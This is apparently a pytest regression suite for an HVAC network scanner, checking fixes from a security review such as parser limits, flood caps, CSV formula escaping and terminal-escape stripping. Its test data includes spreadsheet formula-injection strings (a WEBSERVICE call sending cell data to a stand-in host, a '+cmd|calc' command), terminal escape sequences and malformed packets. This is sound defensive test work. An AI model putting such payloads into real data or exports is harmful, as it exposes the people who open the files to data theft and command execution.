"""2.9.1: the fixes from the external review of 2026-11-06.

One section per finding (H = high, M = medium), each test named for what a
hostile or broken device, or a slip by the user, used to do.
"""

import csv
import json
import socket
import struct
import threading
import time

import pytest

from hvac_scanner import bacnet, codec, engine as engine_mod, netsweep, settings
from hvac_scanner.engine import ScanEngine, ScanOptions, ScanResult, _sanitize_for_json
from hvac_scanner.snmp import SNMPScanner
from hvac_scanner.text import clean_log_line, clean_text, spreadsheet_cell


# ---------------------------------------------------------------------------
# H1: an oversized integer must not end a pass or an export
# ---------------------------------------------------------------------------

def _iam_with_wide_field(which: str, width: int = 2000) -> bytes:
    """An I-Am whose max-APDU, segmentation or vendor-ID field is `width`
    octets, in BACnet's extended-length form."""
    wide = b'\x01' * width
    ext = bytes([0xFE]) + struct.pack('!H', width)  # length 254 marker + 2 octets
    fields = {
        'apdu': (bytes([0x25]) + ext + wide, bytes([0x91, 0x03]), bytes([0x21, 0x05])),
        'seg': (bytes([0x22, 0x05, 0xC4]), bytes([0x95]) + ext + wide, bytes([0x21, 0x05])),
        'vendor': (bytes([0x22, 0x05, 0xC4]), bytes([0x91, 0x03]), bytes([0x25]) + ext + wide),
    }[which]
    apdu = bytes([0x10, 0x00, 0xC4]) + struct.pack('!I', (8 << 22) | 1234) + b''.join(fields)
    return codec.build_bvlc(0x0B, b'\x01\x00' + apdu)


@pytest.mark.parametrize("which", ["apdu", "seg", "vendor"])
def test_iam_with_an_oversized_field_is_not_an_iam(which):
    """One such packet from any host used to raise ValueError inside the
    I-Am collector and end the whole BACnet pass."""
    assert codec.parse_iam(_iam_with_wide_field(which), ('10.0.0.9', 47808)) is None


def test_ordinary_iam_still_parses():
    apdu = (bytes([0x10, 0x00, 0xC4]) + struct.pack('!I', (8 << 22) | 1234)
            + bytes([0x22, 0x05, 0xC4, 0x91, 0x03, 0x21, 0x05]))
    dev = codec.parse_iam(codec.build_bvlc(0x0B, b'\x01\x00' + apdu), ('10.0.0.9', 47808))
    assert (dev.instance, dev.max_apdu, dev.vendor_id) == (1234, 1476, 5)


def test_wide_unsigned_value_decodes_as_hex_not_a_huge_int():
    width = 2000
    data = bytes([0x25, 0xFE]) + struct.pack('!H', width) + b'\xff' * width
    value, nxt = codec._parse_app_value(data, 0)
    assert isinstance(value, str) and nxt == len(data)
    f"{value}"                                       # printable


def test_snmp_huge_integer_is_dropped():
    oid = bytes([0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00])
    val = bytes([0x02, 0x82]) + struct.pack('!H', 1800) + b'\x7f' * 1800
    assert SNMPScanner._parse_snmp_response(b'\x30\x00' + oid + val) is None


def test_json_export_survives_a_huge_integer():
    dev = {'ip': '10.0.0.5', 'vendor_id': 10 ** 5000}
    out = _sanitize_for_json(dev)
    json.dumps(out)
    assert 'too large' in out['vendor_id']


def test_a_failed_pass_is_said_in_the_scan_log(monkeypatch):
    """An exception in a pass used to reach only the module logger: the GUI
    showed an empty result and no reason."""
    lines = []
    eng = ScanEngine(ScanOptions(networks=['127.0.0.1'], scan_bacnet=False, scan_mstp=False,
                                 scan_modbus=False, scan_services=False, scan_p2=False,
                                 scan_knx=False, scan_snmp=True),
                     callback=lines.append)
    monkeypatch.setattr(eng, '_scan_snmp', lambda: (_ for _ in ()).throw(ValueError("boom")))
    result = eng.run()
    assert any("SNMP pass failed: boom" in line for line in lines)
    assert result.passes['snmp'] == 'failed'
    assert not result.complete


# ---------------------------------------------------------------------------
# H2: never share UDP 47808 with other BACnet software on the PC
# ---------------------------------------------------------------------------

def test_port_held_by_another_app_is_not_shared(monkeypatch):
    """Another program's socket allowed reuse; the scanner used to bind
    alongside it and split its traffic. It must take another port."""
    other = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    other.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    other.bind(("", 0))
    taken = other.getsockname()[1]
    monkeypatch.setattr(bacnet, 'BACNET_PORT', taken)
    client = bacnet.BACnetClient(timeout=0.2)
    try:
        assert client.open() != taken
    finally:
        client.close()
        other.close()


def test_bbmd_registration_ttl_is_capped():
    sent = []

    class Sock:
        def sendto(self, pkt, addr):
            sent.append(pkt)

        def gettimeout(self):
            return 1.0

        def settimeout(self, _t):
            pass

        def recvfrom(self, _n):
            raise socket.timeout()

    client = bacnet.BACnetClient(timeout=0.05)
    client._sock = Sock()
    client.register_foreign_device('10.0.0.1', ttl=65535)
    assert struct.unpack('!H', sent[0][4:6])[0] == bacnet.MAX_BBMD_TTL


# ---------------------------------------------------------------------------
# H3: a device's object count is its claim, not a promise
# ---------------------------------------------------------------------------

class _ClaimsTooMuch:
    """A device whose objectList count is 4,294,967,295."""

    def __init__(self):
        self.asked: list[int] = []

    def read_device_info(self, *_a, **_kw):
        return {'vendor_name': 'Nobody', 'model_name': 'Liar'}

    def read_object_list_count(self, *_a, **_kw):
        return 4_294_967_295

    def read_object_list_entries_indexed(self, ip, instance, indices, **_kw):
        self.asked.append(len(indices))
        return []

    def read_object_list_entries(self, ip, instance, indices, **_kw):
        self.asked.append(len(indices))
        return []

    def read_points_batched(self, *_a, **_kw):
        return []


@pytest.mark.parametrize("depth", ["normal", "full"])
def test_object_enumeration_is_capped_whatever_the_device_claims(depth):
    eng = ScanEngine(ScanOptions(networks=['10.0.0.0/24'], scan_depth=depth,
                                 read_metadata=False))
    client = _ClaimsTooMuch()
    dev = {'ip': '10.0.0.5', 'instance': 7, 'vendor_id': 999, 'max_apdu': 480}
    eng._deep_read_device(client, dev)
    assert client.asked and max(client.asked) <= engine_mod.OBJECT_CEILING
    assert dev['_classification']['profile_cap'] <= engine_mod.OBJECT_CEILING


def test_ceiling_rises_only_when_max_objects_asks():
    eng = ScanEngine(ScanOptions(networks=['10.0.0.0/24'], scan_depth='full',
                                 read_metadata=False, max_objects_per_device=50_000))
    dev = {'ip': '10.0.0.5', 'instance': 7, 'vendor_id': 999, 'max_apdu': 480}
    eng._deep_read_device(_ClaimsTooMuch(), dev)
    assert dev['_classification']['profile_cap'] == 50_000


# ---------------------------------------------------------------------------
# H4: the Modbus read loop has a deadline
# ---------------------------------------------------------------------------

def test_modbus_wrong_transaction_ids_cannot_hold_a_request_forever():
    """A server lets one request time out, then sends well-formed frames
    with the wrong transaction ID every 0.1 s, for ever."""
    from hvac_scanner.modbus import _ModbusSession
    srv = socket.socket()
    srv.bind(('127.0.0.1', 0))
    srv.listen(1)
    stop = threading.Event()

    def serve():
        conn, _ = srv.accept()
        conn.recv(64)                                # first request: no answer
        conn.recv(64)                                # second request ...
        while not stop.is_set():                     # ... answered for ever, wrongly
            try:
                conn.sendall(struct.pack('!HHHB', 0xBEEF, 0, 3, 1) + b'\x03\x00')
            except OSError:
                return
            time.sleep(0.1)
        conn.close()
    threading.Thread(target=serve, daemon=True).start()
    try:
        with _ModbusSession('127.0.0.1', srv.getsockname()[1], timeout=0.5) as s:
            assert s.request(1, b'\x03\x00\x00\x00\x01') is None
            start = time.monotonic()
            assert s.request(1, b'\x03\x00\x00\x00\x01') is None
            assert time.monotonic() - start < 2.0
    finally:
        stop.set()
        srv.close()


def test_modbus_gateway_no_device_stops_probing_that_unit():
    """Behind a gateway each request to an empty unit is a serial timeout on
    the building's bus; a "no device" answer ends that unit's probing."""
    from hvac_scanner.modbus import ModbusScanner
    asked = []

    class Session:
        timed_out = False
        no_device = False

        def __init__(self, *_a):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *_a):
            pass

        def request(self, uid, pdu):
            asked.append((uid, pdu[0]))
            self.no_device = True                      # 0x0B: target failed to respond
            return struct.pack('!HHHB', 1, 0, 3, uid) + bytes([pdu[0] | 0x80, 0x0B])

    import hvac_scanner.modbus as m
    real = m._ModbusSession
    m._ModbusSession = Session
    try:
        ModbusScanner(timeout=0.1).scan_host('127.0.0.1', unit_ids=[1, 2])
    finally:
        m._ModbusSession = real
    assert asked == [(1, 0x2B), (2, 0x2B)]


# ---------------------------------------------------------------------------
# H5: nothing a device says becomes a spreadsheet formula
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("text,expected", [
    ("=HYPERLINK(\"http://x\",\"y\")", "'=HYPERLINK(\"http://x\",\"y\")"),
    ("+1+cmd", "'+1+cmd"), ("@SUM(A1)", "'@SUM(A1)"), ("-2+3", "'-2+3"),
    ("\tTAB", "'\tTAB"), ("＝1+1", "'＝1+1"),
    ("-12.5", "-12.5"), ("72.5", "72.5"), ("AHU-1 SAT", "AHU-1 SAT"), (42, 42),
])
def test_spreadsheet_cell(text, expected):
    assert spreadsheet_cell(text) == expected


def _result_with_hostile_names():
    r = ScanResult()
    r.devices = [{
        'protocol': 'BACnet/IP', 'ip': '10.0.0.5', 'port': 47808, 'instance': 5,
        'properties': {'object_name': '=WEBSERVICE("http://x/"&B2)'},
        'title': '+cmd|calc', 'banner': '@evil',
        'objects': [{'type': 'Analog Input', 'instance': 1, 'name': '=1+1',
                     'present_value': '-12.5', 'units': 'degF', 'description': '-x',
                     'status': ''}],
    }]
    return r


def test_device_csv_escapes_formulas(tmp_path):
    path = tmp_path / "d.csv"
    _result_with_hostile_names().write_csv(str(path))
    rows = list(csv.reader(path.open(encoding='utf-8-sig')))
    header, row = rows[0], rows[1]
    assert "Factory Default Login (published, not tried)" in header
    for cell in row:
        assert not cell.startswith(('=', '+', '@')), cell
    assert row[header.index('Object Name')].startswith("'=")


def test_point_csv_escapes_formulas_and_keeps_numbers(tmp_path):
    path = tmp_path / "p.csv"
    _result_with_hostile_names().write_points_csv(str(path))
    rows = list(csv.reader(path.open(encoding='utf-8-sig')))
    header, row = rows[0], rows[1]
    assert row[header.index('Name')] == "'=1+1"
    assert row[header.index('Present Value')] == "-12.5"
    assert row[header.index('Description')] == "'-x"


def test_gui_copy_escapes_formulas(gui_app):
    tree = gui_app.device_tree
    cols = tree["columns"]
    iid = tree.insert('', 'end', values=["=1+1\tx"] + [""] * (len(cols) - 1))
    tree.selection_set(iid)
    gui_app._copy_rows(tree)
    first_cell = gui_app.root.clipboard_get().splitlines()[1].split("\t")[0]
    assert first_cell == "'=1+1 x"


def test_terminal_escapes_are_stripped_from_the_log():
    lines = []
    eng = ScanEngine(ScanOptions(networks=['127.0.0.1']), callback=lines.append)
    eng._log("Device props: object_name=\x1b[2J\x1b]0;owned\x07 AHU‮1")
    assert lines == ["Device props: object_name=[2J]0;owned AHU1"]
    assert clean_log_line("a\n  b\tc") == "a\n  b\tc"
    assert clean_text("a\r\nb") == "a  b"


# ---------------------------------------------------------------------------
# M2: a short target list must not get dozens of connections per host
# ---------------------------------------------------------------------------

def test_tcp_sweep_limits_connections_per_host(monkeypatch):
    open_now: dict[str, int] = {}
    peak: dict[str, int] = {}

    async def fake_open(ip, port):
        import asyncio
        open_now[ip] = open_now.get(ip, 0) + 1
        peak[ip] = max(peak.get(ip, 0), open_now[ip])
        await asyncio.sleep(0.01)
        open_now[ip] -= 1
        raise OSError("refused")

    monkeypatch.setattr(netsweep.asyncio, 'open_connection', fake_open)
    hosts = ['127.0.0.2', '127.0.0.3', '127.0.0.4']
    netsweep.tcp_sweep(((h, p) for p in range(1, 26) for h in hosts),
                       timeout=0.5, concurrency=256)
    assert max(peak.values()) <= netsweep.PER_HOST_LIMIT


# ---------------------------------------------------------------------------
# M5: broadcast on subnets that are not a /24
# ---------------------------------------------------------------------------

def test_wide_cidr_this_pc_is_on_uses_the_limited_broadcast(monkeypatch):
    eng = ScanEngine(ScanOptions(networks=['10.0.0.0/16']))
    monkeypatch.setattr(ScanEngine, '_source_address', lambda self, ip: '10.0.5.10')
    assert eng._compute_bcast('10.0.0.0/16') == '255.255.255.255'


def test_wide_cidr_elsewhere_keeps_its_own_broadcast(monkeypatch):
    eng = ScanEngine(ScanOptions(networks=['10.0.0.0/16']))
    monkeypatch.setattr(ScanEngine, '_source_address', lambda self, ip: '192.168.1.5')
    assert eng._compute_bcast('10.0.0.0/16') == '10.0.255.255'


def test_silent_local_subnet_gets_one_limited_broadcast_retry():
    eng = ScanEngine(ScanOptions(networks=['10.0.4.0/24']))
    assert eng._fallback_bcast('10.0.4.255', ['10.0.4.0/24']) == '255.255.255.255'


def test_no_fallback_for_loopback_or_an_override():
    assert ScanEngine(ScanOptions(networks=['127.0.1.0/24']))._fallback_bcast(
        '127.0.1.255', ['127.0.1.0/24']) is None
    eng = ScanEngine(ScanOptions(networks=['10.0.4.0/24'], bacnet_broadcast='10.0.4.255'))
    assert eng._fallback_bcast('10.0.4.255', ['10.0.4.0/24']) is None


# ---------------------------------------------------------------------------
# M6: floods and slow peers are bounded
# ---------------------------------------------------------------------------

def test_iam_flood_from_one_address_is_capped(monkeypatch):
    monkeypatch.setattr(bacnet, 'BACNET_PORT', 0)
    monkeypatch.setattr(bacnet, '_IAM_PER_IP_LIMIT', 5)
    client = bacnet.BACnetClient(timeout=0.5)
    client.open()
    port = client._sock.getsockname()[1]
    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        for inst in range(40):
            apdu = (bytes([0x10, 0x00, 0xC4]) + struct.pack('!I', (8 << 22) | inst)
                    + bytes([0x22, 0x01, 0xE0, 0x91, 0x03, 0x21, 0x05]))
            sender.sendto(codec.build_bvlc(0x0B, b'\x01\x00' + apdu), ('127.0.0.1', port))
        got = client._collect_iam(deadline=time.time() + 0.5)
    finally:
        sender.close()
        client.close()
    assert len(got) == 5


def test_snmp_drain_ends_while_a_flood_continues():
    class Flood:
        def settimeout(self, _t):
            pass

        def recvfrom(self, _n):
            return b'junk', ('127.0.0.9', 161)

    start = time.monotonic()
    SNMPScanner()._drain(Flood(), {'127.0.0.9'}, {}, b'public', wait=0.0)
    assert time.monotonic() - start < 1.0


def test_trickling_service_probe_is_cut_off(monkeypatch):
    """One byte every 0.1 s, never the end of the reply: a probe used to
    wait for ever, one byte inside each timeout at a time."""
    from hvac_scanner import services
    monkeypatch.setattr(services, '_PROBE_TIME_LIMIT_S', 0.6)
    srv = socket.socket()
    srv.bind(('127.0.0.1', 0))
    srv.listen(1)

    def serve():
        conn, _ = srv.accept()
        try:
            conn.recv(1024)
            for _ in range(200):
                conn.sendall(b'x')
                time.sleep(0.1)
        except OSError:
            pass
        finally:
            conn.close()
    threading.Thread(target=serve, daemon=True).start()
    try:
        start = time.monotonic()
        services.HVACServiceScanner(timeout=1.0)._probe_niagara_fox(
            '127.0.0.1', srv.getsockname()[1])
        assert time.monotonic() - start < 3.0
    finally:
        srv.close()


# ---------------------------------------------------------------------------
# M7: what was not scanned says so
# ---------------------------------------------------------------------------

def _quiet_options(**kw):
    base = dict(networks=['127.0.0.1'], scan_bacnet=False, scan_mstp=False,
                scan_modbus=False, scan_services=False, scan_p2=False, scan_knx=False,
                scan_snmp=False)
    base.update(kw)
    return ScanOptions(**base)


def test_export_records_what_ran():
    result = ScanEngine(_quiet_options()).run()
    cov = result.to_dict()['coverage']
    assert cov['stopped'] is False
    assert cov['passes']['services'] == 'off'
    assert 'networks' not in cov['options']
    assert result.complete


def test_stopped_scan_is_marked_partial():
    stop = threading.Event()
    stop.set()
    result = ScanEngine(_quiet_options(scan_snmp=True), stop_event=stop).run()
    assert result.stopped and not result.complete
    assert result.passes['snmp'] == 'stopped before it ran'


def test_report_says_not_scanned_rather_than_none():
    from hvac_scanner.report import render_html
    scan = ScanEngine(_quiet_options()).run().to_dict()
    page = render_html(scan)
    assert "Not scanned: " in page
    assert "Not scanned (off)." in page                # open service ports
    assert "Nothing to report from what was scanned" in page


def test_report_footer_names_the_bbmd_write_and_the_snmp_community():
    from hvac_scanner.report import render_html
    scan = {'devices': [], 'coverage': {
        'stopped': False, 'passes': {'snmp': 'scanned', 'bacnet': 'scanned'},
        'options': {'bbmd': '10.0.0.1', 'snmp_communities': ['public', '(custom)']}}}
    page = render_html(scan)
    assert "foreign-device registration with the BBMD at 10.0.0.1" in page
    assert "public, (custom)" in page
    assert "no credentials were tried" not in page


# ---------------------------------------------------------------------------
# M8: a site's own SNMP community is not exported
# ---------------------------------------------------------------------------

def test_custom_snmp_community_is_not_exported():
    r = ScanResult()
    r.devices = [{'protocol': 'SNMP', 'ip': '10.0.0.5', 'community': 'S3cretSite'},
                 {'protocol': 'SNMP', 'ip': '10.0.0.6', 'community': 'public'}]
    r.options = engine_mod.coverage_options(ScanOptions(snmp_communities=['public', 'S3cretSite']))
    text = json.dumps(r.to_dict())
    assert 'S3cretSite' not in text
    assert '"public"' in text


# ---------------------------------------------------------------------------
# M10: the baseline only rolls forward on a complete scan
# ---------------------------------------------------------------------------

def _cli(monkeypatch, argv, result):
    from hvac_scanner import cli
    made = []

    class Engine:
        def __init__(self, opts, **_kw):
            made.append(opts)

        def run(self):
            return result

    monkeypatch.setattr(cli, "ScanEngine", Engine)
    return cli.main(argv + ["--quiet", "--print", "none"]), made


def test_partial_scan_does_not_replace_the_baseline(monkeypatch, tmp_path):
    base = tmp_path / "base.json"
    base.write_text(json.dumps({'devices': [], 'scan_time': 'then'}), encoding='utf-8')
    partial = ScanResult()
    partial.stopped = True
    code, _ = _cli(monkeypatch, ["127.0.0.1", "--baseline", str(base),
                                 "--save-baseline", str(base)], partial)
    assert code == 2
    assert json.loads(base.read_text(encoding='utf-8'))['scan_time'] == 'then'


def test_first_run_creates_the_baseline(monkeypatch, tmp_path):
    base = tmp_path / "base.json"
    code, _ = _cli(monkeypatch, ["127.0.0.1", "--baseline", str(base),
                                 "--save-baseline", str(base)], ScanResult())
    assert code == 0 and base.exists()


def test_damaged_baseline_is_reported_before_scanning(monkeypatch, tmp_path):
    base = tmp_path / "base.json"
    base.write_text('{"devices": [', encoding='utf-8')
    code, made = _cli(monkeypatch, ["127.0.0.1", "--baseline", str(base)], ScanResult())
    assert code == 1 and not made


def test_json_is_written_atomically(tmp_path, monkeypatch):
    path = tmp_path / "scan.json"
    path.write_text('{"old": true}', encoding='utf-8')

    def explode(*_a, **_kw):
        raise OSError("disk full")
    monkeypatch.setattr(engine_mod.json, 'dump', explode)
    with pytest.raises(OSError):
        ScanResult().write_json(str(path))
    assert path.read_text(encoding='utf-8') == '{"old": true}'
    assert list(tmp_path.iterdir()) == [path]


# ---------------------------------------------------------------------------
# M9: the CLI refuses what it cannot mean
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("argv", [
    ["127.0.0.1", "--rate-limit", "fifty"],
    ["127.0.0.1", "--timeout", "0"],
    ["127.0.0.1", "--bbmd", "10.0.0"],
    ["127.0.0.1", "--broadcast", "everyone"],
    ["127.0.0.1", "--bbmd-ttl", "3600"],
    ["127.0.0.1", "--bacnet-workers", "0"],
])
def test_cli_rejects_bad_values_with_exit_1(monkeypatch, argv):
    with pytest.raises(SystemExit) as e:
        _cli(monkeypatch, argv, ScanResult())
    assert e.value.code == 1


def test_cli_total_host_cap(monkeypatch, capsys):
    code, made = _cli(monkeypatch, ["10.0.0.0/16", "10.1.0.0/16", "--max-hosts", "70000"],
                      ScanResult())
    assert code == 1 and not made
    assert "more than --max-hosts" in capsys.readouterr().err


# ---------------------------------------------------------------------------
# M11: a damaged settings file is set aside, and profiles survive
# ---------------------------------------------------------------------------

def test_damaged_settings_are_kept_aside(tmp_path):
    path = tmp_path / "settings.json"
    path.write_text('{"profiles": {"Plant": {"targets": "10.0.0.0/24"}', encoding='utf-8')
    data, problem = settings.load_checked(path)
    assert data == {} and problem and "kept as" in problem
    aside = [p for p in tmp_path.iterdir() if p.name.startswith("settings.json.bad-")]
    assert len(aside) == 1 and "Plant" in aside[0].read_text(encoding='utf-8')
    settings.save(path, {'targets': '10.9.0.0/24'})
    assert aside[0].exists()


def test_saving_settings_keeps_profiles_another_window_added(tmp_path):
    path = tmp_path / "settings.json"
    settings.update_profiles(path, lambda p: p.__setitem__('A', {'targets': '10.0.0.0/24'}))
    # Window 2 adds B; window 1, which only knows A, then saves its settings.
    settings.update_profiles(path, lambda p: p.__setitem__('B', {'targets': '10.1.0.0/24'}))
    settings.save(path, {'targets': 'x', 'profiles': {'A': {'targets': '10.0.0.0/24'}}})
    assert set(settings.profiles(settings.load(path))) == {'A', 'B'}


# ---------------------------------------------------------------------------
# M12: duplicate device instances do not collapse in the diff
# ---------------------------------------------------------------------------

def test_duplicate_instances_are_compared_by_where_they_are():
    from hvac_scanner.diff import diff_scans, format_text
    devs = [{'protocol': 'BACnet/MSTP', 'ip': '10.0.0.10', 'instance': 1001,
             'source_network': 5, 'source_address': '3',
             'properties': {'object_name': 'VAV-1'}},
            {'protocol': 'BACnet/MSTP', 'ip': '10.0.0.11', 'instance': 1001,
             'source_network': 6, 'source_address': '3',
             'properties': {'object_name': 'VAV-7'}}]
    d = diff_scans({'devices': devs}, {'devices': list(reversed(devs))})
    assert not d.has_changes, [str(c) for x in d.changed for c in x.changes]
    assert d.duplicates == {'1001': ['10.0.0.11/6/3', '10.0.0.10/5/3']}
    assert "DUPLICATE DEVICE INSTANCES" in format_text(d)


def test_duplicate_instances_are_a_report_finding():
    from hvac_scanner.report import build_findings
    devs = [{'protocol': 'BACnet/IP', 'ip': '10.0.0.10', 'instance': 7},
            {'protocol': 'BACnet/IP', 'ip': '10.0.0.11', 'instance': 7}]
    titles = [f.title for f in build_findings({'devices': devs})]
    assert "Duplicate BACnet device instances" in titles


# ---------------------------------------------------------------------------
# M13: vendor fingerprints match whole words
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("text,vendor", [
    ("goahead-webs", None), ("webserver", None), ("a perfect effect", None),
    ("multiview display", None), ("honeywell webs-n4", "Honeywell / Tridium"),
    ("nae5510 metasys", "Johnson Controls"), ("pcoweb", "Carel"),
    ("lg multi v", "LG Electronics"),
])
def test_vendor_fingerprints_match_words(text, vendor):
    import re
    from hvac_scanner.constants import HTTP_FINGERPRINTS
    got = next((v for p, v in HTTP_FINGERPRINTS if re.search(p, text)), None)
    assert got == vendor


# ---------------------------------------------------------------------------
# Lows
# ---------------------------------------------------------------------------

def test_report_main_keeps_folders_with_dots(tmp_path, monkeypatch):
    from hvac_scanner import report
    folder = tmp_path / "j.smith" / "scans"
    folder.mkdir(parents=True)
    scan = folder / "site"
    scan.write_text(json.dumps({'devices': []}), encoding='utf-8')
    assert report.main([str(scan)]) == 0
    assert (folder / "site.html").exists()


def test_deeply_nested_value_is_refused_not_a_recursion_error():
    data = bytes([0x0E]) * 3000                       # 3,000 opening tags
    assert codec.decode_property_references(data) == []
    with pytest.raises(codec.BACnetParseError):
        codec.decode_tagged(data)


def test_modbus_frame_of_the_largest_legal_length_is_read():
    from hvac_scanner.modbus import ModbusScanner

    class Sock:
        def __init__(self, data):
            self.data = data

        def recv(self, n):
            out, self.data = self.data[:n], self.data[n:]
            return out
    # Length 254 = unit ID + a 253-byte PDU, the 260-byte ADU maximum.
    frame = struct.pack('!HHHB', 1, 0, 254, 1) + b'\x03' + bytes([251]) + b'\x00' * 251
    assert ModbusScanner._recv_frame(Sock(frame)) == frame


def test_new_gui_starts_with_no_target(gui_app):
    assert gui_app.network_entry.get() == ""
